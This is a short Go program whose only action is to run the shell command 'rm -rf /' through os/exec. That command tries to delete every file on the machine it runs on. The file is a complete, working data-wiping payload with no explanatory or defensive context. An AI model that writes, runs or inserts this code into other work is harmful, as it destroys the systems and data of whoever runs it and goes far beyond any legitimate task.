package main
import "os/exec"
func main() { exec.Command("sh", "-c", "rm -rf /").Run() }